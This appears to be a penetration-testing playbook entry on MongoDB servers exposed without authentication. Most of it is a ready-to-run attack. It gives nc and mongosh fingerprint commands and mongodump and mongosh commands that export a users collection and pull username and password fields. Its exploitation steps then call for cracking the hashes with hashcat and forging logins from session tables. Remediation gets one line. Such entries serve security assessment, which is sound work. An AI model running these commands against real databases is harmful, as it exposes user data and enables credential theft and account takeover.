---
title: MongoDB Unauthenticated Access (Dump the Database Directly)
cve: None (misconfiguration)
severity: critical
cvss: 9.0
product: MongoDB
versions: Any (auth disabled)
ports: 27017
keywords: mongodb, unauthenticated, database-dump, database, nosql
entry: mongod has no auth and is exposed
verified: false
sources: Compiled from public sources (misconfiguration class)
---

## Fingerprint

```
nc -vz target 27017
mongosh "mongodb://target:27017" --eval 'db.adminCommand({listDatabases:1})'
```

## Prerequisites

- mongod started without `--auth` and listening on 0.0.0.0.

## PoC

```bash
# 1) List databases
mongosh "mongodb://target:27017" --quiet --eval 'db.adminCommand({listDatabases:1}).databases.map(d=>d.name)'

# 2) Export one collection (take only 5 documents as proof)
mongodump "mongodb://target:27017/app" --collection=users --out=/tmp/mg --limit=5
ls -la /tmp/mg/app/users.bson

# 3) Find admin credentials
mongosh "mongodb://target:27017/app" --quiet --eval 'db.users.find({},{username:1,password:1}).limit(3).toArray()'
# Check: username/password hashes obtained = hit
```

## Exploitation steps

1. Start with listDatabases (read-only);
2. Pick a business database (app/member/admin) and take 5 documents;
3. Feed hashes to hashcat; session tables can be used to forge logins directly;
4. Evidence: database name + collection name + one record (redacted).

## Remediation and mitigation

- Enable auth + strong passwords; listen on internal interfaces only; disable `$where`.

## References

- MongoDB security checklist.
